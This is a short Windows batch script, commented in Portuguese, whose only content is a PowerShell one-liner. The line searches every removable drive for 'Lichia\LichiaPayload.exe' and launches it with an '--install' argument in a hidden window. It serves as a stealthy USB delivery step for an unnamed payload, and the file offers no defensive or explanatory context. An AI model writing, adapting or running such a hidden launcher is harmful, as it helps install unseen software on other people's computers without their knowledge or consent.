@echo off
rem roda o payload a partir do pendrive, sem janela
powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=2' | ForEach-Object { $p = Join-Path $_.Caption 'Lichia\LichiaPayload.exe'; if (Test-Path $p) { Start-Process -FilePath $p -ArgumentList '--install' -WindowStyle Hidden } }"
